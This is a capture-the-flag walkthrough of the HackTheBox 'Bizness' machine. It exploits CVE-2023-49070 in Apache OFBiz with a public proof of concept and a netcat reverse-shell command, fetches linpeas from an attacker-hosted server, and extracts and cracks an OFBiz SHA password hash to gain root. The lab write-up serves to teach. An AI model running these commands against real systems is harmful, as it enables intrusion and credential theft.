# Bizness
<br/>

## Intro
Welcome to the Bizness challenge from HackTheBox Walkthrough, here is the link to the [room](https://app.hackthebox.com/machines/Bizness).
In this challenge we are gonna practice with some web application RCE and than hash cracking to escalate our privileges. 

To interact with the machine connect via OpenVPN using the "lab" config profile.

Whenever you feel ready press "Join the Machine"

<br/>
<br/>

## The Challenge
Before starting we can add the IP address to the hots file
```bash
sudo nano /etc/hosts
```
```
MACHINE-IP  bizness.htb
```


Let's do with a port scan using nmap
```bash
nmap -sV MACHINE_IP
```
Here is the scan report:
```
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp  open  http     syn-ack ttl 63 nginx 1.18.0
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see there is a webserver, let's visit the page:
```
http://bizness.htb
```

Looking around we can find "Powered by **Apache OFBiz**", so i searched if there are any known vulnerabilities, but we still need to find out which version is it running.
I have decided to do a directory scan, maybe in other pages we can see more information about its implementation.
```bash
dirsearch -u https://bizness.htb/ 
```

I have found this `/solr/control/checkLogin/`, navigating to it we can see a login page and on the bottom right there is the version of Apache OFBIz which is 18.12.

Now we can better target our search and i came up to a RCE vulnerability known as CVE-2023-49070.
On GitHub there is PoC that we can download:
```bash
git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
```

Once you have cloned it navigate inside the directory and run
```bash
python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash YOUR-IP PORT'
```

On your machine you need to have a listener enabled:
```bash
nc -lvnp PORT
```

And you will have the shell, now we can grab the first flag:

Firstly let's upgrade the shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Than put the shell in background with `CTRL+Z`, write
```bash
stty raw -echo
```

Foreground the reverse-shell
```bash
fg
```

Reset the shell
```
reset
```
```bash
export SHELL=bash
```
```bash
export TERM=xterm-256color
```

Now you should have a fully interactive shell.

```bash
cat /home/ofbiz/user.txt
```
--> REDACTED

<br/>

### Privilege Escalation
It is time to escalate our privileges to root to read the last flag.

I downloaded linpeas script file to help me
```bash
cp /usr/share/peass/linpeas/linpeas.sh .
```

We need to transfer it to the target:
```bash
python3 -m http.server
```

```bash
wget http://ATTACKER-IP:8000/linpeas.sh
```
make the script executable
```bash
chmod +x linpeas.sh
```
now run it
```bash
./linpeas.sh > report.txt
```

One interesting path was continously appearing: /opt/ofbiz/runtime/data/derby/

Now we can go and take a look at the database directory that linpeas had discovered 
```bash
cd /opt/ofbiz/runtime/data/derby/ofbiz/seg0
```

In this directory i did some tries searching for keywords like this:
```bash
grep -r -l "Password" *
```

Until i found this file containing what i was looking for:
```bash
strings c54d0.dat
```

--> currentPassword=`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`
Looking at this we can understand that the hash type is SHA, `d` is the salt and the rest are the hashed bytes.

Before throwing it into hashcat we have to apply some changes, in fact the hash had undergone some modifications (as we can find in the files at `/opt/ofbiz/framework/base/src/main/java/org/apache/ofbiz/base/crypto`)
1. Substitute `_` with `/` and `-` with `+`
2. Encode the result in hex
3. Remove the spaces
4. Add the salt `:d`

We can do all the above steps using CyberChef online or by creating a script, you have the choice.

Now we can create a file containing the hash
```bash
echo "HASH:d" > hash.txt
```

At this point we can run hashcat
```bash
hashcat -a 0 -m 120 final_hash.txt /usr/share/wordlist/rockyou.txt
```
And in a short time we get the root password: monkeybizness, now we can login ad get the root flag

```bash
su root
```

```bash
cat /root/root.txt
```
--> REDACTED

<br/>

Congratulations, we are now in Bizness! I hope you had fun and learned something new. <br>
If you wanna see more write ups you can check the WriteUps Directory in this GitHub repo. <br>
Catch you in the next CTF 😃 <br>
